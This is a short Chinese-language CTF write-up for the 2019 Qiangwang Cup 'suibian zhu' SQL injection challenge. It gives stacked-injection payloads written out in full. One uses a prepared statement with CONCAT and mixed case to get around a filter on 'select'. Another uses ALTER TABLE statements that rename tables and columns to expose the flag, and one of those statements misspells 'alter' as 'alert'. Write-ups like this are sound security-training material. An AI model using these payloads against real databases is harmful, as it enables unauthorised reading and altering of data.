强网杯 2019-随便注

2021-01-26 CTF题解 406 words
BUUCTF

输入单引号报错，

单引号闭合

两个字段。

好家伙，select给我ban了

好家伙内联注释也用不了。

堆叠注入可以，查到了库名和表名。

分别查询 两个字段里面的信息

在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符

分析可知

  1. 输出点应该是在 id字段

  2. flag存在于supersqli数据库中的1919810931114514表的flag字段。

下面就要开始骚姿势了。

由于正则字段中的数据是查询不出来了的，只有两种方式，

  1. 预编译绕过正则

  2. 将flag所在的表和flag都变成words和id 直接查询输出

预编译

set 用于设置变量名和值
prepare 用于预备一个语句，并赋予名称，以后可以引用该语句
execute 执行语句
deallocate prepare 用来释放掉预处理的语句

因此构造payload

set  @sql=CONCAT('se','lect * from `1919810931114514`;');
prepare test from @sql;
EXECUTe test;

1'set @sql=CONCAT('se','lect * from 1919810931114514;');prepare test from @sql;EXECUTe test;#

strstr（）函数可以大小写绕过

修正payload：

1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare test from @sql;EXECUTe test;#

得到flag

修改表名

修改表名(将表名user改为users)
alter table user rename to users;

修改列名(将字段名username改为name)
alter table users change uesrname name varchar(30);

因此构造payload：

alert table words rename to 123;
alert table `1919810931114514` rename to words;
alert table words change flag id int(40);
1';alert table words rename to     123;alert table `1919810931114514` rename to words;alert table words change flag id varchar(50);#

使用1‘ or 1=1 # 得到flag。
